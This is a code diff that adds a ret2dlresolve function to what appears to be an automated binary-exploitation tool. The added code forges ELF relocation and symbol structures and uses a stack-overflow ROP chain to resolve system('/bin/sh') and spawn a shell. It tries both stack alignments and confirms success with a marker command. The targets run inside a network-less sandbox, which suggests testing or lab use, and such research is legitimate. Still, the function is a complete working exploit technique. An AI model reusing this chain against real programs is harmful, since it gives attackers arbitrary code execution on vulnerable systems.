@@ -388,6 +388,71 @@ def ret2libc_leak(exe, workdir, *, offset, pop_rdi, puts_plt, puts_got, ret_to,
                                    "shell under either stack alignment)", "leaked": last_leaked}
 
 
+def ret2dlresolve(exe, workdir, *, offset, read_plt, plt0, pop_rdi, pop_rsi, pop_rdx, ret_gadget,
+                  jmprel, symtab, strtab, scratch, symbol=b"system", arg=b"/bin/sh",
+                  base_argv=(), timeout: float = 8.0, mem_mb: int = 2048) -> dict:
+    """Leak-free ret2dlresolve, confirmed by a spawned shell. Forge an Elf64_Rela + Elf64_Sym +
+    the "system" string in the target's own .bss, read them in with one read(0, scratch, n), then
+    drop into PLT0 with the forged reloc index so the loader resolves `symbol` and calls it with
+    rdi = &arg. No libc leak, no `system` PLT entry -- it works against whatever loader the target
+    runs under (older air-gap glibc included), because everything forged is the target's own data.
+
+    system()/do_system needs a 16-byte-aligned rsp and the re-entered frame's parity is
+    environment-dependent, so BOTH parities are detonated on a fresh process each. Success = the
+    spawned shell EVALUATES the forgery-proof marker. Returns {ok, align, ...}.
+    """
+    from . import attribution, rop
+    markers = attribution.make_code_markers()
+    exedir = str(Path(exe).resolve().parent)
+    argv = [str(a) for a in base_argv]
+    for align in (False, True):
+        chain, fake = rop.build_ret2dlresolve(
+            offset, read_plt=read_plt, plt0=plt0, pop_rdi=pop_rdi, pop_rsi=pop_rsi, pop_rdx=pop_rdx,
+            ret_gadget=ret_gadget, jmprel=jmprel, symtab=symtab, strtab=strtab, scratch=scratch,
+            symbol=symbol, arg=arg, align=align)
+        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
+        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
+        try:
+            p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                 stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
+                                 preexec_fn=preexec)
+        except Exception as e:                           # noqa: BLE001
+            return {"ok": False, "reason": f"spawn failed: {e!r}"}
+        try:
+            _read_until(p, time.time() + 0.5)            # drain the target's banner
+            try:
+                p.stdin.write(chain); p.stdin.flush()    # stage 1: overflow -> read(scratch) chain
+                time.sleep(0.2)
+                p.stdin.write(fake); p.stdin.flush()     # the forged structures the read consumes
+                time.sleep(0.3)
+            except (BrokenPipeError, OSError):
+                continue                                 # crashed before the resolve -> try parity
+            if p.poll() is None:
+                try:
+                    p.stdin.write(markers.command + b"\n")
+                    p.stdin.flush()
+                except (BrokenPipeError, OSError):
+                    pass
+            out = _read_until(p, time.time() + timeout, quiet=1.5)
+            if markers.proves(out):                      # a shell EVALUATED the challenge
+                return {"ok": True, "align": align, "scratch": scratch, "reloc_symbol": symbol,
+                        "output": out[:400].decode("latin-1", "ignore")}
+        finally:
+            for stream in (p.stdin, p.stdout):
+                try:
+                    if stream is not None:
+                        stream.close()
+                except Exception:                        # noqa: BLE001
+                    pass
+            _kill(p)
+            try:
+                p.wait(timeout=2)
+            except Exception:                            # noqa: BLE001
+                pass
+    return {"ok": False, "reason": "no shell confirmed (ret2dlresolve did not spawn a shell under "
+                                   "either stack alignment; is the target binding lazily?)"}
+
+
 # --- analyst-assisted PIE ret2libc (pure-libc ROP; no pie_base needed) --------------------------
 def analyst_ret2libc(exe, workdir, *, offset, libc_data, leak_offset=None, leak_sym=None,
                      leak_trigger: bytes = b"", leak_regex: str = r"0x[0-9a-fA-F]+",
